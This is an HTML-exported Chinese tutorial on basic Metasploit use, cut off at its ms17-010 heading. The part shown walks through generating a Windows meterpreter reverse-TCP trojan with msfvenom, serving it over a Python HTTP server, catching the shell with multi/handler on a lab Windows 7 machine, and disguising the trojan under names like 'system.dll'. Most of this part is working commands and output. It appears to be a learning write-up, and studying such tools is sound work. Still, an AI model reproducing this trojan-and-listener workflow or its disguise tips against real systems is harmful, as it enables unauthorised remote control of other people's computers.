@@ -1,0 +1,373 @@
+<!DOCTYPE html><html><head>
+      <title>msf工具的简单利用</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:////home/neko/.vscode-oss/extensions/shd101wyy.markdown-preview-enhanced-0.8.10-universal/crossnote/dependencies/katex/katex.min.css">
+      
+      
+      
+      
+      
+      <style>
+      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+    // your code here
+  });
+</script></head><body for="html-export">
+    
+    
+      <div class="crossnote markdown-preview  ">
+      
+<h1 id="metasploit框架的简单使用">Metasploit框架的简单使用 </h1>
+<p>Metasploit是经典的渗透测试框架，常见与很多的渗透测试环境中，也能独立安装与windows,linux环境</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code><span class="token punctuation">[</span>neko@NekoArch ~<span class="token punctuation">]</span>$ msfconsole 
+Metasploit tip: Use the edit <span class="token builtin class-name">command</span> to <span class="token function">open</span> the currently active module 
+<span class="token keyword keyword-in">in</span> your editor
+                                          
+                                              <span class="token variable"><span class="token variable">`</span>:oDFo:<span class="token variable">`</span></span>                    
+                                           ./ymM0dayMmy/.                  
+                                        -+dHJ5aGFyZGVyIQ<span class="token operator">==</span>+-            
+                                    <span class="token variable"><span class="token variable">`</span>:sm⏣~~Destroy.No.Data~~s:<span class="token variable">`</span></span>        
+                                 -+h2~~Maintain.No.Persistence~~h+-      
+                             <span class="token variable"><span class="token variable">`</span>:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:<span class="token variable">`</span></span>  
+                          ./etc/shadow.0days-Data<span class="token string">'%20OR%201=1--.No.0MN8'</span>/.  
+                       -++SecKCoin++e.AMd<span class="token variable"><span class="token variable">`</span>       <span class="token variable">`</span></span>.-://///+hbove.913.ElsMNh+-  
+                      -~/.ssh/id_rsa.Des-                  <span class="token variable"><span class="token variable">`</span>htN01UserWroteMe<span class="token operator">!</span>-  
+                      :dopeAW.No<span class="token operator">&lt;</span>nano<span class="token operator">&gt;</span>o                     :is:TЯiKC.sudo-.A:  
+                      :we<span class="token string">'re.all.alike'</span><span class="token variable">`</span></span>                     The.PFYroy.No.D7:  
+                      :PLACEDRINKHERE<span class="token operator">!</span>:                      yxp_cmdshell.Ab0:  
+                      :msf<span class="token operator">&gt;</span>exploit -j.                       :Ns.BOB<span class="token operator">&amp;</span>ALICEes7:  
+                      :---srwxrwx:-.<span class="token variable"><span class="token variable">`</span>                        <span class="token variable">`</span></span>MS146.52.No.Per:  
+                      :<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>.Ac816/                        sENbove3101.404:  
+                      :NT_AUTHORITY.Do                        <span class="token variable"><span class="token variable">`</span>T:/shSYSTEM-.N:  
+                      :09.14.2011.raid                       /STFU<span class="token operator">|</span>wall.No.Pr:  
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:  
+                      <span class="token builtin class-name">:</span><span class="token comment">#OUTHOUSE-  -s:                       /corykennedyData:  </span>
+                      :$nmap <span class="token parameter variable">-oS</span>                              SSo.6178306Ence:  
+                      :Awsm.da:                            /shMTl<span class="token comment">#beats3o.No.:  </span>
+                      :Ring0:                             <span class="token variable">`</span></span>dDestRoyREXKC3ta/M:  
+                      :23d:                               sSETEC.ASTRONOMYist:  
+                       /-                        /yo-    .ence.N:<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token builtin class-name">:</span><span class="token operator">|</span><span class="token builtin class-name">:</span> <span class="token operator">&amp;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token builtin class-name">:</span>  
+                                                 <span class="token variable"><span class="token variable">`</span>:Shall.We.Play.A.Game?tron/  
+                                                 <span class="token variable">`</span></span>`<span class="token variable"><span class="token variable">`</span>-ooy.if1ghtf0r+ehUser5<span class="token variable">`</span></span>  
+                                               <span class="token punctuation">..</span>th3.H1V3.U2VjRFNN.jMh+.<span class="token variable"><span class="token variable">`</span>  
+                                              <span class="token variable">`</span></span>MjM~~WE.ARE.se~~MMjMs      
+                                               +~KANSAS.CITY's~-<span class="token variable"><span class="token variable">`</span>          
+                                                J~HAKCERS~./.<span class="token variable">`</span></span>            
+                                                .esc:wq<span class="token operator">!</span>:<span class="token variable"><span class="token variable">`</span>                
+                                                 +++ATH<span class="token variable">`</span></span>                    
+                                                  `
+
+
+       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.3.43-dev                          <span class="token punctuation">]</span>
++ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2376</span> exploits - <span class="token number">1232</span> auxiliary - <span class="token number">416</span> post       <span class="token punctuation">]</span>
++ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">1388</span> payloads - <span class="token number">46</span> encoders - <span class="token number">11</span> nops           <span class="token punctuation">]</span>
++ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">9</span> evasion                                       <span class="token punctuation">]</span>
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 <span class="token operator">&gt;</span> 
+</code></pre><p>msfconsole是Metasploit中的一个重要模块，甚至可以说它就是Met中最精华的模块之一，上面是msf启动后的样子</p>
+<p>启动命令就是 <code>msfconsole</code></p>
+<p>这次我们将用这个模块渗透攻击两个靶机，除了漏洞使用外还有木马生成，漏洞分别是ms17-010与cve2019-0708都是相对有名的漏洞，我们将用它来熟悉msf的基础</p>
+<p>以下是这次会涉及的内容</p>
+<ul>
+<li>msfvenom木马生成</li>
+<li>msfconsole中的poc与exp的使用</li>
+<li>反弹shell与直连shell</li>
+</ul>
+<p>ok 开始吧</p>
+<p>先来点简单的——一些基础名词</p>
+<ul>
+<li>
+<p><strong>payload[有效载荷]</strong></p>
+<p>有效载荷又叫做payload一般指的就是通过漏洞或某种手段交付到目标系统的恶意代码，恶意代码可以各式各样，窃取信息，恶意代理，shellcode，宽泛点说只要是获取了他不该获取的信息都可以称之为“恶意代码"</p>
+</li>
+<li>
+<p><strong>poc[概念验证]</strong></p>
+<p>POC 是 "Proof of Concept"（概念验证）的缩写。在安全领域一般为漏洞的概念验证，他的存在是为了为某个漏洞提供足够的证据，有时候可靠的poc也可被改造为漏洞的扫描工具</p>
+</li>
+<li>
+<p><strong>exp[漏洞利用]</strong></p>
+<p>"Exp" 是 "exploit" 的缩写，指的是漏洞利用（Exploitation）的手段或工具。他是一种通过系统，软件漏洞来获得系统控制权的方式，一般而言一个exp有三个要素，漏洞，payload，利用方式。</p>
+</li>
+<li>
+<p><strong>Reverse Shell［反弹shell］</strong></p>
+<p>反弹shell，目标通过自身网络返回攻击者的设备，并建立一个交互式shell。这样的特性使得他常常出现于被攻击设备位于NAT后的情况。</p>
+</li>
+<li>
+<p><strong>Bind Shell [直连shell]</strong></p>
+<p>直连shell，被攻击的设备将系统连接到自身ip与特定端口，建立交互shell，攻击者通过连接获得系统的控制权，类似的ssh就是一种直连shell。这样的特性使得他通常出现于攻击者位于NAT后的情况。</p>
+</li>
+</ul>
+<p>理解了这些我们就可以正式的来生成一个木马</p>
+<h2>msfvenom木马生成</h2>
+<p>这个是msfvenom翻译后的help页</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>MsfVenom - Metasploit 独立负载生成器。
+也是 msfpayload 和 msfencode 的替代品。
+用法：/opt/metasploit/msfvenom <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token operator">&lt;</span>var<span class="token operator">=</span>val<span class="token operator">&gt;</span>
+示例：/opt/metasploit/msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>IP<span class="token operator">&gt;</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> Payload.exe
+
+选项：
+     -l, <span class="token parameter variable">--list</span> <span class="token operator">&lt;</span>type<span class="token operator">&gt;</span> 列出 <span class="token punctuation">[</span>type<span class="token punctuation">]</span> 的所有模块。 类型有：有效负载、编码器、nops、平台、拱门、加密、格式、所有
+     -p, <span class="token parameter variable">--payload</span> <span class="token operator">&lt;</span>payload<span class="token operator">&gt;</span> 要使用的有效负载（--list 要列出的有效负载，--list-options 用于参数）。 为自定义指定“-”或 STDIN
+         --list-options 列出 <span class="token parameter variable">--payload</span> <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span> 的标准、高级和规避选项
+     -f, <span class="token parameter variable">--format</span> <span class="token operator">&lt;</span>格式<span class="token operator">&gt;</span> 输出格式（使用--list 格式列出）
+     -e, <span class="token parameter variable">--encoder</span> <span class="token operator">&lt;</span>encoder<span class="token operator">&gt;</span> 要使用的编码器（使用 <span class="token parameter variable">--list</span> 编码器列出）
+         --service-name <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span> 生成服务二进制文件时使用的服务名称
+         --sec-name <span class="token operator">&lt;</span>值<span class="token operator">&gt;</span> 生成大型 Windows 二进制文件时使用的新节名称。 默认值：随机 <span class="token number">4</span> 字符字母字符串
+         <span class="token parameter variable">--smallest</span> 使用所有可用的编码器生成尽可能小的有效负载
+         <span class="token parameter variable">--encrypt</span> <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span> 应用于 shellcode 的加密或编码类型（使用 <span class="token parameter variable">--list</span> encrypt 列出）
+         --encrypt-key <span class="token operator">&lt;</span>值<span class="token operator">&gt;</span> 用于--encrypt 的密钥
+         --encrypt-iv <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span> <span class="token parameter variable">--encrypt</span> 的初始化向量
+     -a, <span class="token parameter variable">--arch</span> <span class="token operator">&lt;</span>arch<span class="token operator">&gt;</span> 用于 <span class="token parameter variable">--payload</span> 和 <span class="token parameter variable">--encoders</span> 的架构（使用 <span class="token parameter variable">--list</span> archs 列出）
+         <span class="token parameter variable">--platform</span> <span class="token operator">&lt;</span>platform<span class="token operator">&gt;</span> <span class="token parameter variable">--payload</span> 的平台（使用 <span class="token parameter variable">--list</span> platform 列出）
+     -o, <span class="token parameter variable">--out</span> <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> 将有效负载保存到文件中
+     -b, --bad-chars <span class="token operator">&lt;</span>list<span class="token operator">&gt;</span> 要避免的字符示例：<span class="token string">'\x00\xff'</span>
+     -n, <span class="token parameter variable">--nopsled</span> <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> 在有效负载上添加 <span class="token punctuation">[</span>length<span class="token punctuation">]</span> 大小的 nopsled
+         --pad-nops 使用 <span class="token parameter variable">-n</span> <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> 指定的 nopsled 大小作为总有效负载大小，自动预先添加数量的 nopsled（nops 减去有效负载长度）
+     -s, <span class="token parameter variable">--space</span> <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> 结果有效负载的最大大小
+         --encoder-space <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span> 编码有效负载的最大大小（默认为 <span class="token parameter variable">-s</span> 值）
+     -i, <span class="token parameter variable">--iterations</span> <span class="token operator">&lt;</span>count<span class="token operator">&gt;</span> 对有效负载进行编码的次数
+     -c, --add-code <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> 指定要包含的附加 win32 shellcode 文件
+     -x, <span class="token parameter variable">--template</span> <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> 指定用作模板的自定义可执行文件
+     -k, <span class="token parameter variable">--keep</span> 保留 <span class="token parameter variable">--template</span> 行为并将有效负载作为新线程注入
+     -v, --var-name <span class="token operator">&lt;</span>值<span class="token operator">&gt;</span> 指定用于某些输出格式的自定义变量名称
+     -t, <span class="token parameter variable">--timeout</span> <span class="token operator">&lt;</span>秒<span class="token operator">&gt;</span> 从 STDIN 读取负载时等待的秒数（默认 <span class="token number">30</span>，0 禁用）
+     -h, <span class="token parameter variable">--help</span> 显示此消息
+</code></pre><p>我们可以通过上面的提示来生成一个最简单的木马</p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.155 LPORT=4444 &gt; test.exe</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code><span class="token punctuation">[</span>neko@NekoArch ~<span class="token punctuation">]</span>$ msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.43.155 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> test.exe
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span class="token number">510</span> bytes
+Final size of exe file: <span class="token number">7168</span> bytes
+Saved as: test.exe
+</code></pre><p>这样我们就有了一个最基础的的木马，当他被运行时他会往192.168.43.155:4444这个地址发送一个 meterpretershell。</p>
+<p>我们可以在本地开一个简单的http服务器让被攻击设备访问下载木马运行。</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code><span class="token punctuation">[</span>neko@NekoArch ~<span class="token punctuation">]</span>$ python <span class="token parameter variable">-m</span> http.server
+Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">8000</span> <span class="token punctuation">(</span>http://0.0.0.0:8000/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
+</code></pre><p>同时在msfconsole新建一个监听器来接收shell，一般使用exploit/multi/handler模块</p>
+<p><code>search handler</code></p>
+<p>搜索</p>
+<p><code>use 30</code></p>
+<p>跳转到模块</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 <span class="token operator">&gt;</span> use <span class="token number">30</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp
+msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> 
+</code></pre><p>一般情况下默认的payload是linux的shell，我们可以通过options来查看详细信息</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 
+
+Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options <span class="token punctuation">(</span>generic/shell_reverse_tcp<span class="token punctuation">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
+   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span class="token number">0</span>   Wildcard Target
+
+
+
+View the full module info with the info, or info <span class="token parameter variable">-d</span> command.
+</code></pre><p>我们可以通过set命令来设置大多数参数</p>
+<p><code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
+<p>通过opt可以看到他默认的端口就是4444，我们只需要填入我们本地的ip地址即可。可以通过ip a来查看</p>
+<p><code>set lhost 192.168.43.155</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Payload options <span class="token punctuation">(</span>windows/x64/meterpreter/reverse_tcp<span class="token punctuation">)</span>:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
+   LHOST     <span class="token number">192.168</span>.43.155   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
+   LPORT     <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port
+</code></pre><p>run</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.43.155:4444 
+</code></pre><p>靶机下载文件</p>
+<p><img src="image/msf%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/1701948392753.png" alt="1701948392753"></p>
+<p>双击运行</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.43.155:4444 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200774</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.43.63
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.43.155:4444 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.43.63:49281<span class="token punctuation">)</span> at <span class="token number">2023</span>-12-07 <span class="token number">19</span>:29:45 +0800
+
+meterpreter <span class="token operator">&gt;</span> 
+</code></pre><p>连接建立</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>meterpreter <span class="token operator">&gt;</span> sysinfo
+Computer        <span class="token builtin class-name">:</span> <span class="token environment constant">USER</span>-PC
+OS              <span class="token builtin class-name">:</span> Windows <span class="token number">7</span> <span class="token punctuation">(</span><span class="token number">6.1</span> Build <span class="token number">7601</span>, Service Pack <span class="token number">1</span><span class="token punctuation">)</span>.
+Architecture    <span class="token builtin class-name">:</span> x64
+System Language <span class="token builtin class-name">:</span> zh_CN
+Domain          <span class="token builtin class-name">:</span> WORKGROUP
+Logged On Users <span class="token builtin class-name">:</span> <span class="token number">2</span>
+Meterpreter     <span class="token builtin class-name">:</span> x64/windows
+</code></pre><p>真正渗透的时候一般都会对木马做免杀，伪装等等处理，最起码改个什么QQupdata，system.dll之类的名称来做伪装。</p>
+<h2>经典款漏洞ms17010</h2>
+<blockquote>
